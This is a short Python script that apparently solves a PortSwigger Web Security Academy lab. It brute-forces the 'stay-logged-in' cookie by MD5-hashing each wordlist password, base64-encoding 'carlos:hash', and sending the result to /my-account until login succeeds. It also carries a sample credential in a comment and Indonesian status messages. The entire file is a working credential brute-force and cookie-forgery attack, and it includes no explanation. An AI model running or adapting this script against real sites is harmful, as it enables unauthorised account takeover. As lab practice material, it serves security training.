import hashlib
import base64
import requests
from bs4 import BeautifulSoup

url = "https://0a84004803af2bc4c04a738500d40009.web-security-academy.net/my-account"
password = open("password.txt","r").readlines()


#wiener:51dc30ddc473d43a6011e9ebba6ca770
#payload = d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
for pas in password:
	pas = pas.replace("\n","")
	md5pas = hashlib.md5(pas.encode()).hexdigest()
	payload = f"carlos:{md5pas}"
	
	print(payload)
	payload_enc = base64.b64encode(bytes(payload,"utf-8"))
	payload = payload_enc.decode("utf-8")
	cookies = {
	"stay-logged-in":payload
	}

	print(cookies)
	response = requests.get(url,cookies=cookies)
	soup = str(BeautifulSoup(response.text, 'html.parser').find('button', class_='button').get_text().strip())
	
	if("Log in" == soup):
		print(f"gagal payload enc nya \n")
	else:
		print(f"berhasil")
		break


